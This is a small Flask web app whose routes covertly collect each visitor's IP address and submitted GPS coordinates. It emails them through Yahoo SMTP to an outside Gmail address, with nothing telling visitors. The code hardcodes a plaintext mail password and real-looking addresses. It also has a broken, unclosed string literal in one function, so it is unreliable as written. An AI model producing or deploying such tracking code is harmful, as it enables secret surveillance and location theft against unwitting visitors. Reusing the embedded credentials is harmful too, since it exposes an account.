from flask import Flask, render_template, request
import smtplib
import geocoder

app = Flask(__name__)

@app.route('/')
def index():
    # Send the IP address to Yahoo
    send_ip_to_yahoo(request.remote_addr)

    # Render the index.html page
    return render_template('index.html')

@app.route('/location', methods=['POST'])
def location():
    # Parse the location data from the request body
    lat = request.form['latitude']
    lon = request.form['longitude']

    # Send the IP and location data to Yahoo
    send_location_to_yahoo(request.remote_addr, lat, lon)

    # Return a response to the client
    return 'Location received successfully.'

def send_ip_to_yahoo(ip):
   sender_email = 'titolion980@yahoo.com
    receiver_email = '01028838444a@gmail.com'
    subject = 'Client IP Address'
    message = f'The client IP address is: {ip}'
    email_text = f'Subject: {subject}\n\n{message}'

    with smtplib.SMTP('smtp.mail.yahoo.com', 587) as server:
        server.ehlo()
        server.starttls()
        server.login(sender_email, 'your_password')
        server.sendmail(sender_email, receiver_email, email_text)

def send_location_to_yahoo(ip, lat, lon):
    sender_email = 'titolion980@yahoo.com'
    receiver_email = '01028838444a@gmail.com'
    subject = 'Client Location'
    message = f'The client IP address is: {ip}\n'
    message += f'The client location is: {lat}, {lon}'
    email_text = f'Subject: {subject}\n\n{message}'

    with smtplib.SMTP('smtp.mail.yahoo.com', 587) as server:
        server.ehlo()
        server.starttls()
        server.login(sender_email, 'Police@123')
        server.sendmail(sender_email, receiver_email, email_text)

if __name__ == '__main__':
    app.run()
